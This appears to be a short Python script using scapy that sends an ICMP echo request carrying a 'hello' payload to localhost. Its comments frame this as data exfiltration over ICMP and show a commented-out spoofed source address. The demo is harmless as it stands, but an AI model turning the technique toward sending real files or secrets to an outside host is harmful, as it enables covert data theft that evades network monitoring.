from scapy.all import *
import random

dst_addr = "127.0.0.1"

# lets make up a return address (if we dont want echo replys)
# return_addr = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
return_addr = dst_addr

# here is the data we want to exfil
payload = "hello"
payload = payload.encode(encoding="utf-8")

# Creating an ICMP Echo request packet
icmp_packet = IP(dst=dst_addr, src=return_addr) / ICMP()
icmp_packet.add_payload(payload)
send(icmp_packet)
